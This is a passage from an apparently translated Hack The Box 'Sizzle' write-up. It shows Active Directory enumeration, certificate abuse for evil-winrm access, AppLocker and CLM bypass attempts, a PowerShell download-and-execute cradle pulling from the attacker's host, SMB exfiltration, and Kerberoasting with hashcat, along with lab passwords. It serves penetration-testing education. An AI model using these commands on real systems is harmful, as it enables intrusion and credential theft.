ku kv kw ij bi translated"><code class="fe mj mk ml mm b">HTB\Amanda</code>的密码是<code class="fe mj mk ml mm b">Ashare1972</code>。然后我列举更多。我从域的密码策略开始，所以我可以意识到潜在的锁定。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="4d37" class="kx ky iq mm b gy mv mw l mx my">cme smb 10.10.10.103 -d HTB -u amanda -p Ashare1972 --pass-pol</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/dfb9b72c5a9eb7aa692ed3e5ad75b83d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FB8TyZP7d_xnGYJXkAnwvg.png"/></div></div></figure><p id="215c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因此锁定时间为30分钟，最小密码长度为7。然后，我将这些共享列为<code class="fe mj mk ml mm b">amanda</code>，希望可以对这些共享进行读/写访问。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="e823" class="kx ky iq mm b gy mv mw l mx my">cme smb 10.10.10.103 -d HTB -u amanda -p Ashare1972 --shares</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ol"><img src="../Images/55dc2746d141646ff9f075ba0d77b9fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N_YpxV_MbH6d1zhmno4jWg.png"/></div></div></figure><p id="4ed4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">没什么有趣的。我做的下一件事是使用<code class="fe mj mk ml mm b">ldapdomaindump</code>枚举域:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="4ca5" class="kx ky iq mm b gy mv mw l mx my">ldapdomaindump 10.10.10.103 -u HTB\\amanda -p Ashare1972 -o ldapdomaindump/ --no-json --no-grep</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi om"><img src="../Images/72f53b958ab96868d952713ab783e806.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bzO8_X-UhtzJDZMYh-Tj_A.png"/></div></div></figure><p id="d03e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以域用户是<code class="fe mj mk ml mm b">sizzler</code>、<code class="fe mj mk ml mm b">mrlky</code>和<code class="fe mj mk ml mm b">amanda</code>。值得注意的是<code class="fe mj mk ml mm b">mrlky</code>和<code class="fe mj mk ml mm b">amanda</code>属于<code class="fe mj mk ml mm b">Remote Management Users</code>组，这意味着它们可以执行<code class="fe mj mk ml mm b">PS Remoting</code>，后者运行在端口5985(HTTP)或5986(HTTPS)上。然后我试着通过<code class="fe mj mk ml mm b">evil-winrm</code>登录，但是出错了。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="605c" class="kx ky iq mm b gy mv mw l mx my">evil-winrm -u amanda -i 10.10.10.103 -p Ashare1972</span></pre><p id="9043" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">没有其他线索，于是我决定回到<code class="fe mj mk ml mm b">/certsrv</code>并使用<code class="fe mj mk ml mm b">amanda’s</code>凭证。我可以登录了。然后我意识到我必须在这里做一些工作，以便在<code class="fe mj mk ml mm b">evil-winrm</code>(端口5986)上使用SSL登录。我查看了<code class="fe mj mk ml mm b">evil-winrm </code>的旗帜，发现了一些我可能需要的旗帜:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/9fdb410e923cf0716929c236a11f8379.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*jCKRJV6xpz5w6An33h__xw.png"/></div></figure><p id="4e4c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以我很可能需要某种公钥和私钥。我不会解释这里涉及的概念，因为它们令人困惑，我可能无法向你解释清楚。建议你自己看。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oo"><img src="../Images/b75462f215ea3e8565aa9c98badb5583.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EOTsjNp-FFBoSAyElWgVGA.png"/></div></div></figure><p id="d666" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我以域用户<code class="fe mj mk ml mm b">amanda</code>的身份登录，所以我尝试请求一个用户证书。这些步骤是请求一个证书- &gt;用户证书- &gt;密钥强度。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi op"><img src="../Images/d3a010f4678c5c14b493532cbf604759.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*1CRMKZ1tjUuC9OSIwM2X8w.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/340bf5a3fb44da07cda90a6d566e6dcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:666/format:webp/1*jjcxmbPUz967SYkIcakBGA.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/5e4990fa40aa151f05fc69cde1efe7a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:744/format:webp/1*5XjR5w7-bvz0xm2rcCfi4w.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/54b01fc20ca5fc21658892a48110a9b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/1*LyrKkaw_xS031wz3IlldEQ.png"/></div></figure><p id="20b1" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以看到我的浏览器上安装了一个证书。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/b1953bdfe7a9db43a33ddf88dbe33ed3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*zusnHgT6U3dyC2fZUdigPQ.png"/></div></figure><p id="7983" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我可以对这个文件进行备份，这将产生一个<a class="ae jy" href="https://en.wikipedia.org/wiki/PKCS_12" rel="noopener ugc nofollow" target="_blank"> .p12 </a>文件。我把它命名为<code class="fe mj mk ml mm b">amanda</code>。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ou"><img src="../Images/891167970e46a69d11e0374e244c9331.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yIn7P65zETWbLNez4LuDNg.png"/></div></div></figure><p id="af22" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以从. p12文件中提取私钥文件:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="ab2d" class="kx ky iq mm b gy mv mw l mx my">openssl pkcs12 -in amanda -nocerts -out amanda.key</span></pre><p id="cf0c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以创建一个CSR(证书签名请求),并在AD CS上提交其内容:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="40b3" class="kx ky iq mm b gy mv mw l mx my">openssl req -newkey rsa:2048 -keyout amanda.key -nodes -out amanda.csr</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/10bc519f77aeda10db4bf2136428c715.png" data-original-src="https://miro.medium.com/v2/resize:fit:1030/format:webp/1*400jq-a69iXIRHQuL1vx8A.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/1864e47bc9b26deb50c2928ede5c7f64.png" data-original-src="https://miro.medium.com/v2/resize:fit:862/format:webp/1*TKIwwtRbWscj_0fzB6ukJg.png"/></div></figure><p id="a414" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以下载DER编码的证书并输入到<code class="fe mj mk ml mm b">evil-winrm</code>:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="cf10" class="kx ky iq mm b gy mv mw l mx my">evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S</span></pre><p id="7028" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以以<code class="fe mj mk ml mm b">amanda</code>的身份登录:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/5c194d01682e6da9d6c7d48264527831.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/1*DmPEIKhw6ZZ_5N2Dt1Q2QQ.png"/></div></figure><h2 id="bf72" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">阿曼达→ Mrlky</h2><p id="2ac5" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">然后我递归地列出了<code class="fe mj mk ml mm b">C:\Users</code>目录下的文件:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="d87a" class="kx ky iq mm b gy mv mw l mx my">gci -path c:\users\ -recurse -depth 3</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/5b459b293e95c300982b93ecb90acbed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/1*DkZV-jqHsyvL5uUq513cKg.png"/></div></figure><p id="2605" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我使用了<code class="fe mj mk ml mm b">evil-winrm </code>的一个内置特性，它绕过了<a class="ae jy" href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" rel="noopener ugc nofollow" target="_blank">AMSI</a>，但是被阻止了，因为<code class="fe mj mk ml mm b">PowerShell</code>似乎处于<a class="ae jy" href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/" rel="noopener ugc nofollow" target="_blank">受限语言模式</a>。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oz"><img src="../Images/b207cf3ab5c347d275a06e06cacd5b1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qSbXgRlTrKhyP639VwZ5Lg.png"/></div></div></figure><p id="839c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我试图加载<code class="fe mj mk ml mm b">SharpHound</code>的<code class="fe mj mk ml mm b">PowerShell</code>版本，这是<code class="fe mj mk ml mm b">Bloodhound</code>的一个入口(注意，这是一个坏的opsec，因为我已经有一个CLM被启用的提示)。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="9877" class="kx ky iq mm b gy mv mw l mx my">iex(new-object net.webclient).downloadString('<a class="ae jy" href="http://10.10.14.3/s.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.3/s.ps1'</a>); invoke-bloodhound -collectionmethod All --LdapUsername Amanda --Domain HTB --LdapPassword Ashare1972 --EncryptZip --ZipFilename sif0</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pa"><img src="../Images/a89cfad2312c0340f089f3120fef15da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GYD_8mLZ6-xE74GehpjJGA.png"/></div></div></figure><p id="89b8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我被拒绝了。然后我决定确认一下我是否真的在CLM，事实上我也在:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pb"><img src="../Images/7daedbb8340afab575f247414e967510.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eyFz7vP_hO91Nxpx0c2hZw.png"/></div></div></figure><p id="993f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我尝试了常见的旁路，即降级到<code class="fe mj mk ml mm b">PowerShell</code>版本2，但这在<code class="fe mj mk ml mm b">evil-winrm</code>上不起作用，至少根据我的经验。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/feda49038c9348a124913b795f1772f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/format:webp/1*4a81j1x0ugn6AoO-UqexVA.png"/></div></figure><p id="558a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我决定将文件放在一个通常绕过<code class="fe mj mk ml mm b"><a class="ae jy" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker" rel="noopener ugc nofollow" target="_blank">Applocker</a></code>的目录中(基本上是另一种防止未授权的二进制文件和应用程序)。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f248" class="kx ky iq mm b gy mv mw l mx my">c:\windows\system32\spool\drivers\color\</span></pre><p id="b7fd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我用PowerShell的<code class="fe mj mk ml mm b">Invoke-WebRequest</code>把<code class="fe mj mk ml mm b">SharpHound.ps1</code>(命名为s.ps1)放在盒子上。我试图进口<code class="fe mj mk ml mm b">SharpHound</code>，但仍然无法。我一直在运行<code class="fe mj mk ml mm b">SharpHound</code>，向您展示启用CLM的局限性。然后我在盒子上贴上【s.exe】(取名为T4)。我可以运行它。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pd"><img src="../Images/561f77decc92af6b34003003b307d654.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3iXUla-xH_fogyRXWZoa0A.png"/></div></div></figure><p id="7411" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我尝试通过SMB复制<code class="fe mj mk ml mm b">Bloodhound</code> zip文件:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pe"><img src="../Images/d0b70e01d010688ad5450daf161c5fe1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BnNP6Hn4I-WUeZl_28w8pw.png"/></div></div></figure><p id="6049" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在我的<code class="fe mj mk ml mm b">impacket</code> smbserver上，我收到重复的传入和关闭的连接，我认为如果客户端因为不允许连接到SMBv1共享而无法进行身份验证，这就是一个问题。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pf"><img src="../Images/cf4088116e5d2e9538afd613a4a6b185.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FcpSKRhhkbei_ZOgh6T7nQ.png"/></div></div></figure><p id="3099" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我决定将我的共享挂载为驱动器<code class="fe mj mk ml mm b">x:</code>，指定用户名和密码进行身份验证:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="50f4" class="kx ky iq mm b gy mv mw l mx my">net use x: \\10.10.14.3\sifo /user:sifo sifopassword</span></pre><p id="b43a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我重新运行了我的smbserver:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="c7b7" class="kx ky iq mm b gy mv mw l mx my">sudo /opt/impacket/examples/smbserver.py sifo . -smb2support -username sifo -password sifopassword</span></pre><p id="b6fe" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我复制了文件。我还计算了文件的MD5哈希，以进行完整性检查。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oc"><img src="../Images/393e8bd1a15d79539315abaa6720111f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZxpVP7jOsby7kNfCSDAOcA.png"/></div></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pg"><img src="../Images/091f4f8c7479c5864e243637d8447da1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C_eDEWavrWvnHjDX0ETVsg.png"/></div></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/b1c374abcf4b39767c44511d101371a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/1*1nkp95e5OcFUt1v3yUb9Gg.png"/></div></figure><p id="2214" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在我在本地机器上有了这个文件，我启动<code class="fe mj mk ml mm b">neo4j</code>作为启动<code class="fe mj mk ml mm b">Bloodhound</code> GUI的准备。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="7c29" class="kx ky iq mm b gy mv mw l mx my">/usr/bin/neo4j console</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi gj"><img src="../Images/815429b4c028be3c0ef26cdaf8eda14c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SGppV31CERD5ijCK1EK6-Q.png"/></div></div></figure><p id="584e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我接着发射<code class="fe mj mk ml mm b">Bloodhound</code>:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/46bd11672e449f7a9a380e6c45d2e20d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/format:webp/1*SD1NpacETSxzsf6cO6ho0g.png"/></div></figure><p id="47b1" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我查看了<code class="fe mj mk ml mm b">mrlky’s</code>的详细信息:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/73149ecc14d5dd877e67da70ef86f096.png" data-original-src="https://miro.medium.com/v2/resize:fit:872/format:webp/1*20VNWXCIJHXtOsXYBZUrDQ.png"/></div></figure><p id="59a5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">值得注意的是，他有一套SPN。另外，<code class="fe mj mk ml mm b">mrlky</code>在域<code class="fe mj mk ml mm b">HTB.LOCAL</code>上有两个<code class="fe mj mk ml mm b">GetChanges(DCSync)</code>权限，我可以在以后访问<code class="fe mj mk ml mm b">mrlky</code>用户时使用它们。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/9058391f9e9dcfe650e752be60964eed.png" data-original-src="https://miro.medium.com/v2/resize:fit:716/format:webp/1*UA5ky2sZ-MIaxdcSih3V-g.png"/></div></figure><h2 id="4bdf" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">Kerberoasting认证:</h2><p id="92bd" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated"><code class="fe mj mk ml mm b">Kerberoasting</code>是一种攻击，允许您恢复与<code class="fe mj mk ml mm b">SPN</code>相关联的帐户密码。我需要为目标帐户的那个<code class="fe mj mk ml mm b">SPN</code>请求一个服务票<code class="fe mj mk ml mm b">(TGS)</code>。<code class="fe mj mk ml mm b">TGS</code>的加密类型是<code class="fe mj mk ml mm b">RC4_HMAC_MD5</code>，这意味着<code class="fe mj mk ml mm b">TGS</code>是使用目标账户的NTLM散列加密的。如果帐户的密码足够弱，我可以破解它并获得明文密码。</p><p id="fef4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">知道为用户<code class="fe mj mk ml mm b">mrlky</code>设置了一个<code class="fe mj mk ml mm b">SPN</code>，我可以尝试Kerberoasting认证这个帐户。我将使用Rubeus，这是一个在活动目录评估中非常有用的工具。然后我在机器上下载了一个副本，运行它来检查它是否正常。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pk"><img src="../Images/ed5f91e776c133de751a0efe92533587.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d8OSz2gB1ohOJHanjxmgSg.png"/></div></div></figure><p id="1721" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我首先计算明文密码<code class="fe mj mk ml mm b">Ashare1972</code>的RC4，因为这是请求TGT所必需的:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="bab7" class="kx ky iq mm b gy mv mw l mx my">.\r.exe hash /password:Ashare1972</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/13927023400b7659f82f9979ac442fee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*5v-fB8WHtSZXgquBR-uUeg.png"/></div></figure><p id="c246" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我请求一张票作为<code class="fe mj mk ml mm b">amanda</code>，并将文件保存到<code class="fe mj mk ml mm b">amanda-tgt</code>，</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="fb1a" class="kx ky iq mm b gy mv mw l mx my">.\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:amanda-tgt</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pm"><img src="../Images/ba79fd85201046cfda9337e4fdeb0df9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f_5xz_ge764F22RfNUKGeA.png"/></div></div></figure><p id="5de3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在我有了一个TGT，我可以请求服务<code class="fe mj mk ml mm b">http/sizzle</code>的服务票，它将使用<code class="fe mj mk ml mm b">mrlky</code>的NTLM散列加密。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="e598" class="kx ky iq mm b gy mv mw l mx my">.\r.exe asktgs /service:http/sizzle /ticket:amanda-tgt</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pn"><img src="../Images/cdadd07b614618259b7296f57a940c97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H8BLpA7VBp-j7tKaeqbBCQ.png"/></div></div></figure><p id="5146" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">看到一切正常，我现在可以使用Rubeus的kerberoast模块再次请求一个<code class="fe mj mk ml mm b">TGS</code>:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="88ea" class="kx ky iq mm b gy mv mw l mx my">.\r.exe kerberoast /spn:http/sizzle /ticket:amanda-tgt /nowrap</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi po"><img src="../Images/6364d959ffa13e9deb2d3563f9872c44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ADVQSbL08EgVhvmkmyM7fQ.png"/></div></div></figure><p id="b3cf" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查hashcat的示例hashes，破解<code class="fe mj mk ml mm b">TGS-REP etype 23</code>(我认为是<code class="fe mj mk ml mm b">RC4-HMAC</code>)需要<code class="fe mj mk ml mm b">mode 13100</code>。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/b19bfee027bc77e6aa9aee3eb7b26927.png" data-original-src="https://miro.medium.com/v2/resize:fit:906/format:webp/1*qmUBD4goPn3Uo7LkcduOPQ.png"/></div></figure><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="6dc2" class="kx ky iq mm b gy mv mw l mx my">hashcat -m 13100 spn-hash /usr/share/wordlists/rockyou.txt --force</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pq"><img src="../Images/f66d8ad14a7f4f84b6d995c28f28e824.png" data-original-src="https://miro.medium.com/v2/resize:fit:644/format:webp/1*miOimhTa3ataIY7jTxiXfA.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pr"><img src="../Images/ae91fc258f6c8137e0cf368668415d73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1288/format:webp/1*w3wHtclBKBuKZfKTvIBllg.png"/></div></figure><p id="b31e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Hashcat能够破解它。mrlky的密码是<code class="fe mj mk ml mm b">Football#7</code>。</p><p id="ae8b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请注意，用户mrlky在域<code class="fe mj mk ml mm b">HTB.LOCAL</code>上拥有<code class="fe mj mk ml mm b">GetChanges</code>权限。在警犬的帮助下:</p><blockquote class="nc nd ne"><p id="e831" class="jz ka na kb b kc kd ke kf kg kh ki kj nf kl km kn ng kp kq kr nh kt ku kv kw ij bi translated">用户MRLKY@HTB。LOCAL在域HTB.LOCAL上具有DS-Replication-Get-Changes特权。单独来说，此边缘不授予执行攻击的能力。但是，结合DS-Replication-Get-Changes-All，主体可能会执行DCSync攻击。</p></blockquote><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/92707a864289fc2f17a0d93582d6a767.png" data-original-src="https://miro.medium.com/v2/resize:fit:798/format:webp/1*48IECUPmchZ1Ny7YryqFBg.png"/></div></figure><p id="72c9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在我想到滥用DCsync之前，我需要在<code class="fe mj mk ml mm b">mrlky.</code>的上下文中重复前面执行的步骤，以获得一个<code class="fe mj mk ml mm b">.cer</code>文件和一个<code class="fe mj mk ml mm b">.key</code>文件来连接到<code class="fe mj mk ml mm b">PS Remoting</code>。从. p12文件生成<code class="fe mj mk ml mm b"> .key</code>文件:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="7f2b" class="kx ky iq mm b gy mv mw l mx my">openssl pkcs12 -in mrlky.p12 -nocerts -out mrlky.key</span></pre><p id="61f2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">生成CSR:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="6d98" class="kx ky iq mm b gy mv mw l mx my">openssl req -newkey rsa:2048 -keyout mrlky.key -nodes -out mrlky.csr</span></pre><p id="7c4f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以在SIZZLE上以<code class="fe mj mk ml mm b">mrlky</code>的身份登录:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="2625" class="kx ky iq mm b gy mv mw l mx my">evil-winrm -u mrlky -i 10.10.10.103 -S -c mrlky.cer -k mrlky.key -p Football#7</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" 